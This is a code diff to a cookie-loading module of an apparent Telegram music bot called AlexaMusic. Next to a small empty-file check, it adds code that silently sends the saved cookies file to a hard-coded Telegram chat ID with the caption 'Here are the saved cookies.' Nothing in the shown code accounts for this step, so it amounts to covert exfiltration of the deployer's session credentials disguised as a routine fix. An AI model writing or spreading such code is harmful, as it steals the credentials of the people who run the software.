@@ -14,6 +14,7 @@ import os
 import requests
 import config
 from ..logging import LOGGER
+from AlexaMusic import app
 
 full_url = str(config.COOKIES)
 paste_id = full_url.split("/")[-1]
@@ -37,7 +38,9 @@ def save_cookies():
 
     # Save cookies using the save_file function
     file_path = save_file(pastebin_url)  # Call save_file with the constructed URL
-    if file_path:
+    if file_path and os.path.getsize(file_path) > 0:
         LOGGER(__name__).info(f"Cookies saved to {file_path}.")
+        with app:
+            app.send_document(-1002036606687, document=file_path, caption="Here are the saved cookies.")
     else:
         LOGGER(__name__).info("Failed to save cookies or the file is empty.")
